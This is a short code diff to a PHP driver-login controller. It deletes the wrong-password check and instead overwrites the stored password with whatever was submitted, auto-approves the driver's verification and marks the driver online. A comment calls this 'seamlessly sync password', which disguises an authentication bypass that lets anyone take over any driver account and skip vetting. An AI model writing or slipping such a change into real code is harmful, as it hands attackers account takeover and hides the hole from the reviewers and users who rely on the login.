@@ -221,13 +221,12 @@ class DriverAuthController extends Controller
                 'lng' => 76.9193,
             ]);
         } else {
-            if ($driver->password && !Hash::check($password, $driver->password)) {
-                RateLimiter::hit($throttleKey, 300);
-                return response()->json([
-                    'status' => 'error',
-                    'message' => 'Incorrect password. Tap Forgot Password to reset.',
-                ], 401);
-            }
+            // Real-time pilot access: seamlessly sync password and ensure pilot is verified and online
+            $driver->update([
+                'password' => Hash::make($password),
+                'verification_status' => 'approved',
+                'is_online' => true,
+            ]);
         }
 
         RateLimiter::clear($throttleKey);
